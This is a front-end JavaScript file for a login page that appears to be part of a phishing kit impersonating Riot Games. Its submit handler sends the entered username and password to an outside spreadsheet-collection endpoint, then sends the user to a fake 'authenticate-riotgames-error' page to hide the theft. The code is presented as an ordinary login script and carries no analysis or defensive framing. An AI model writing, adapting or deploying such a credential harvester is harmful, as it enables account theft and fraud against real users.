const inputs = document.querySelectorAll('.input')
const button = document.querySelector('.login-btn')

const handleFocus = ({ target }) => {
  const span = target.previousElementSibling
  span.classList.add('span-active')
}

const handleFocusOut = ({ target }) => {
  if (target.value === '') {
    const span = target.previousElementSibling
    span.classList.remove('span-active')
  }
}

const handleChange = () => {
  const [username, password] = inputs

  if (username.value.length >= 3 && password.value.length >= 8) {
    button.removeAttribute('disabled')
  } else {
    button.setAttribute('disabled', '')
  }
}

inputs.forEach((input) => input.addEventListener('focus', handleFocus))
inputs.forEach((input) => input.addEventListener('focusout', handleFocusOut))
inputs.forEach((input) => input.addEventListener('input', handleChange))

const btn = document.getElementById('btn')

const addLoading = () => {
  btn.innerHTML = ' <img src="./images/load-icon.png" class="loading">'
}

const removeLoading = () => {
  btn.innerHTML = ' <i class="ph-bold ph-arrow-right"></i>'
}

const handleSubmit = (event) => {
  event.preventDefault()
  addLoading()

  const username = document.querySelector('input[name=username]').value
  const password = document.querySelector('input[name=password]').value

  fetch('https://api.sheetmonkey.io/form/wePitmkydxXYfwi7echpcP', {
    method: 'post',
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ username, password }),
  }).then(() => {
    removeLoading()
    window.location.href = 'https://authenticate-riotgames-error.vercel.app/'
  })
}

document.querySelector('form').addEventListener('submit', handleSubmit)
